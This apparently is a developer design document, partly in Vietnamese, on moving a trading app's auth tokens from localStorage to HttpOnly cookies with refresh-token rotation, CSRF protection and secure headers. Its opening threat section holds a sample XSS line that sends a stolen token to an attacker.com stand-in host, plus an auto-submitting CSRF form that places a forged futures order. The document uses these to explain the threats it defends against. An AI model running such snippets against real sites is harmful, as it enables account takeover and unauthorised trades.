# Security Improvements: From localStorage to HttpOnly Cookies

## 🔴 Vấn đề hiện tại: localStorage

### 1. XSS (Cross-Site Scripting) Vulnerability
**Vấn đề**: Nếu attacker inject được JavaScript vào trang web (qua comment, input field, etc.), họ có thể đánh cắp token.

```javascript
// Attacker's malicious script
const stolenToken = localStorage.getItem('auth_token');
fetch('https://attacker.com/steal?token=' + stolenToken);
```

**Hậu quả**:
- Attacker có thể impersonate user
- Truy cập tất cả protected APIs
- Thực hiện trading orders với tài khoản của user

### 2. Accessible by Any JavaScript
```javascript
// Bất kỳ JavaScript nào cũng có thể đọc:
console.log(localStorage.getItem('auth_token'));

// Third-party libraries:
// - Google Analytics
// - Chat widgets
// - Advertisement scripts
// Tất cả đều có thể access token
```

### 3. No Automatic Expiration
- Token tồn tại mãi mãi cho đến khi user logout
- Ngay cả khi đóng browser, token vẫn còn
- Không có cơ chế auto-cleanup

### 4. CSRF (Cross-Site Request Forgery) Vulnerable
```html
<!-- Attacker's website -->
<form action="https://yourapp.com/api/v1/futures/place-order" method="POST">
  <input name="symbol" value="BTCUSDT">
  <input name="side" value="SHORT">
  <input name="positionSize" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

---

## ✅ Giải pháp: HttpOnly Cookies + Refresh Token Pattern

### Architecture Overview

```
┌─────────────┐                ┌─────────────┐
│   Client    │                │   Server    │
└─────────────┘                └─────────────┘
       │                              │
       │ 1. POST /auth/login          │
       │─────────────────────────────>│
       │                              │
       │ 2. Set-Cookie: access_token  │
       │    (httpOnly, 15min)         │
       │    Set-Cookie: refresh_token │
       │    (httpOnly, 7days)         │
       │<─────────────────────────────│
       │                              │
       │ 3. API Request               │
       │    (cookies auto-attached)   │
       │─────────────────────────────>│
       │                              │
       │ 4. Access token expired?     │
       │    401 Unauthorized          │
       │<─────────────────────────────│
       │                              │
       │ 5. POST /auth/refresh        │
       │    (refresh_token in cookie) │
       │─────────────────────────────>│
       │                              │
       │ 6. New access_token          │
       │    Set-Cookie: access_token  │
       │<─────────────────────────────│
       │                              │
       │ 7. Retry original request    │
       │─────────────────────────────>│
```

### Key Benefits

#### 1. **HttpOnly Cookies**
```http
Set-Cookie: access_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict
```

**Benefits**:
- ✅ **Cannot be accessed by JavaScript** (XSS protection)
- ✅ **Auto-attached** to requests by browser
- ✅ **Secure flag**: Only sent over HTTPS
- ✅ **SameSite**: CSRF protection

#### 2. **Short-lived Access Token**
```
Access Token: 15 minutes
Refresh Token: 7 days
```

**Benefits**:
- ✅ Limited window if token is compromised
- ✅ Auto-expires, reducing risk
- ✅ Must refresh frequently

#### 3. **Refresh Token Rotation**
```
Every time refresh token is used:
1. Invalidate old refresh token
2. Issue new refresh token
3. Issue new access token
```

**Benefits**:
- ✅ One-time use only
- ✅ Detect token theft (if old token used again)
- ✅ Can revoke all sessions

#### 4. **CSRF Protection**
```http
Cookie: SameSite=Strict
Header: X-CSRF-Token
```

**Benefits**:
- ✅ Blocks cross-site requests
- ✅ Double-submit cookie pattern
- ✅ Origin checking

---

## 🔧 Implementation Plan

### Backend Changes

#### 1. Create Refresh Token Entity
```typescript
@Entity('refresh_tokens')
export class RefreshToken {
  @PrimaryGeneratedColumn('uuid')
  id: string;

  @Column()
  token: string; // hashed

  @Column()
  userId: string;

  @Column()
  expiresAt: Date;

  @Column({ default: false })
  isRevoked: boolean;

  @Column({ nullable: true })
  replacedByToken: string; // for rotation tracking

  @CreateDateColumn()
  createdAt: Date;
}
```

#### 2. Update Auth Service
```typescript
async login(loginDto: LoginDto, res: Response) {
  // ... validate user ...

  // Generate tokens
  const accessToken = this.generateAccessToken(user); // 15min
  const refreshToken = this.generateRefreshToken();   // 7days

  // Save refresh token to DB (hashed)
  await this.saveRefreshToken(user.id, refreshToken);

  // Set httpOnly cookies
  res.cookie('access_token', accessToken, {
    httpOnly: true,
    secure: true, // HTTPS only
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000, // 15 minutes
  });

  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });

  return { message: 'Login successful' };
}

async refresh(refreshToken: string, res: Response) {
  // Verify refresh token
  const tokenRecord = await this.findRefreshToken(refreshToken);

  if (!tokenRecord || tokenRecord.isRevoked) {
    throw new UnauthorizedException('Invalid refresh token');
  }

  if (tokenRecord.expiresAt < new Date()) {
    throw new UnauthorizedException('Refresh token expired');
  }

  // Rotate refresh token
  const newRefreshToken = this.generateRefreshToken();
  await this.revokeRefreshToken(refreshToken);
  await this.saveRefreshToken(tokenRecord.userId, newRefreshToken);

  // Generate new access token
  const user = await this.userRepository.findOne({
    where: { id: tokenRecord.userId }
  });
  const newAccessToken = this.generateAccessToken(user);

  // Set new cookies
  res.cookie('access_token', newAccessToken, { /* ... */ });
  res.cookie('refresh_token', newRefreshToken, { /* ... */ });

  return { message: 'Token refreshed' };
}
```

#### 3. Auth Guard Changes
```typescript
@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt') {
  canActivate(context: ExecutionContext) {
    const request = context.switchToHttp().getRequest();

    // Extract token from cookie instead of header
    const token = request.cookies?.access_token;

    if (!token) {
      throw new UnauthorizedException('No token provided');
    }

    // Attach to request for passport strategy
    request.headers.authorization = `Bearer ${token}`;

    return super.canActivate(context);
  }
}
```

### Frontend Changes

#### 1. Remove localStorage Usage
```javascript
// ❌ OLD (localStorage)
localStorage.setItem('auth_token', token);
const token = localStorage.getItem('auth_token');

// ✅ NEW (cookies - automatic)
// No manual handling needed!
// Browser automatically sends cookies
```

#### 2. Update API Calls
```javascript
// ✅ NEW - Include credentials
fetch(`${API_URL}/api/v1/platforms`, {
  credentials: 'include', // Important! Sends cookies
  headers: {
    'Content-Type': 'application/json',
  },
});
```

#### 3. Handle Token Refresh
```javascript
// Axios interceptor for auto-refresh
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 and haven't retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Call refresh endpoint
        await fetch(`${API_URL}/api/v1/auth/refresh`, {
          method: 'POST',
          credentials: 'include', // Sends refresh_token cookie
        });

        // Retry original request
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh failed, redirect to login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

#### 4. Update useAuth Hook
```javascript
export function useAuth() {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    checkAuth();
  }, []);

  const checkAuth = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/v1/auth/profile`, {
        credentials: 'include', // Sends cookies
      });

      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
      } else {
        setUser(null);
      }
    } catch (error) {
      console.error('Auth check failed:', error);
      setUser(null);
    } finally {
      setIsLoading(false);
    }
  };

  const logout = async () => {
    await fetch(`${API_BASE_URL}/api/v1/auth/logout`, {
      method: 'POST',
      credentials: 'include',
    });
    setUser(null);
    navigate('/login');
  };

  return { user, isLoading, isAuthenticated: !!user, logout, checkAuth };
}
```

---

## 🛡️ Additional Security Measures

### 1. CSRF Token
```typescript
// Backend
@Controller('auth')
export class AuthController {
  @Get('csrf-token')
  getCsrfToken(@Req() req, @Res() res) {
    const csrfToken = generateCsrfToken();
    res.cookie('XSRF-TOKEN', csrfToken, {
      httpOnly: false, // Client needs to read this
      secure: true,
      sameSite: 'strict',
    });
    return { csrfToken };
  }

  @Post('login')
  @UseGuards(CsrfGuard)
  login(/* ... */) {
    // ...
  }
}

// Frontend
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('XSRF-TOKEN='))
  ?.split('=')[1];

fetch(`${API_URL}/api/v1/auth/login`, {
  method: 'POST',
  headers: {
    'X-XSRF-TOKEN': csrfToken,
  },
  credentials: 'include',
  body: JSON.stringify({ email, password }),
});
```

### 2. Rate Limiting
```typescript
import { ThrottlerGuard, ThrottlerModule } from '@nestjs/throttler';

// app.module.ts
ThrottlerModule.forRoot({
  ttl: 60,
  limit: 10, // 10 requests per minute
}),

// auth.controller.ts
@UseGuards(ThrottlerGuard)
@Post('login')
login(/* ... */) {}
```

### 3. IP Whitelisting
```typescript
@Injectable()
export class IpWhitelistGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const request = context.switchToHttp().getRequest();
    const ip = request.ip;

    // Check if IP is whitelisted
    const whitelist = process.env.IP_WHITELIST?.split(',') || [];
    return whitelist.includes(ip);
  }
}
```

### 4. Secure Headers
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
  },
}));
```

---

## 📊 Comparison

| Feature | localStorage | httpOnly Cookies |
|---------|--------------|------------------|
| XSS Protection | ❌ Vulnerable | ✅ Protected |
| CSRF Protection | ✅ Protected | ⚠️ Needs SameSite |
| Auto-sent | ❌ Manual | ✅ Automatic |
| JavaScript Access | ❌ Yes (bad) | ✅ No (good) |
| Size Limit | 5-10MB | 4KB |
| Cross-domain | ✅ Easy | ⚠️ Complex |
| Mobile Apps | ✅ Easy | ❌ Hard |
| Token Rotation | ❌ Manual | ✅ Easy |

---

## 🚀 Migration Path

### Phase 1: Dual Support (Transition)
```typescript
// Support both localStorage and cookies
const token =
  req.cookies?.access_token ||
  req.headers.authorization?.replace('Bearer ', '');
```

### Phase 2: Deprecation Notice
```javascript
// Frontend warning
if (localStorage.getItem('auth_token')) {
  console.warn('localStorage auth is deprecated. Please re-login.');
  localStorage.removeItem('auth_token');
}
```

### Phase 3: Full Migration
```typescript
// Remove localStorage support completely
// Only accept cookies
```

---

## 🎯 Recommendation

### For Web Applications (Recommended):
✅ **HttpOnly Cookies + Refresh Token Pattern**
- Best security
- Auto token refresh
- XSS protection
- CSRF protection with SameSite

### For Mobile Apps:
⚠️ **Secure Storage + Token Rotation**
- React Native: `@react-native-async-storage/async-storage` + encryption
- Not httpOnly cookies (doesn't work well in mobile)
- Still implement refresh token rotation

### For Both Web + Mobile:
✅ **Hybrid Approach**
- Cookies for web
- Secure storage for mobile
- Same backend API
- Different auth strategies

---

## 🔍 Testing Security

### 1. Test XSS Protection
```javascript
// Try to steal token via console
console.log(document.cookie); // Should NOT see httpOnly cookies
console.log(localStorage.getItem('auth_token')); // Should be null
```

### 2. Test CSRF Protection
```html
<!-- Attacker's site -->
<form action="https://yourapp.com/api/v1/platforms" method="POST">
  <!-- Should fail due to SameSite=Strict -->
</form>
```

### 3. Test Token Refresh
```javascript
// Wait 15 minutes, access token expires
// Next request should auto-refresh
// Check Network tab for /auth/refresh call
```

### 4. Test Token Rotation
```javascript
// Use refresh token twice
// Second use should fail (one-time use only)
```

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [HttpOnly Cookie Specification](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---

## ❓ FAQ

**Q: Tại sao không dùng localStorage cho web app?**
A: Vì XSS attacks có thể đánh cắp token. HttpOnly cookies an toàn hơn.

**Q: Cookies có dùng được cho mobile app không?**
A: Không tốt. Mobile apps nên dùng secure storage với encryption.

**Q: Làm sao để logout tất cả devices?**
A: Revoke tất cả refresh tokens của user trong database.

**Q: CSRF token có cần thiết không khi đã có SameSite=Strict?**
A: SameSite=Strict đủ cho hầu hết cases. CSRF token là layer bảo mật thêm.

**Q: Access token 15 phút có quá ngắn không?**
A: Không. Auto-refresh transparent cho user. Ngắn = bảo mật hơn.
